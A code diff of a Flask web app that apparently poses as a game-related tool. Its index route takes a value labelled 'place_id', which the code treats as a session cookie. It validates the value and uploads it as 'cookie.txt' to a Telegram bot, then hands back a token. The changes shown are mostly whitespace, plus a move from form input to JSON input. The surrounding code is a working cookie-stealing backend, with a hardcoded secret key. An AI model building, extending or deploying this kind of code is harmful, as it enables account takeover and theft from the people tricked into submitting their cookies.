@@ -4,7 +4,7 @@ import secrets
 from pathlib import Path
 import json
   
-app = Flask(__name__)  
+app = Flask(__name__)
 
 app.secret_key = "goodboylol67"  
 
@@ -25,7 +25,7 @@ DEFAULT_GAME = next(
 )
   
 sessions = {} 
-  
+    
 def send_txt_to_telegram(text_content: str):  
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"  
     files = {"document": ("cookie.txt", text_content, "text/plain")}  
@@ -49,14 +49,17 @@ def validate_cookie(cookie: str) -> bool:
   
   
 @app.route('/', methods=['GET', 'POST'])  
-def index():  
+def index():
     if request.method == 'POST':  
-        cookie = request.form.get('place_id', '').strip()  
+        #cookie = request.form.get('place_id', '').strip()
+        
+        data = request.get_json()
+        cookie = data.get('place_id', '')
   
         if not validate_cookie(cookie):  
             return jsonify({"type": "error", "msg": "XAR invalid or not found."})  
     
-        send_txt_to_telegram(cookie)  
+        send_txt_to_telegram(cookie)
     
         token = secrets.token_urlsafe(20)  
     
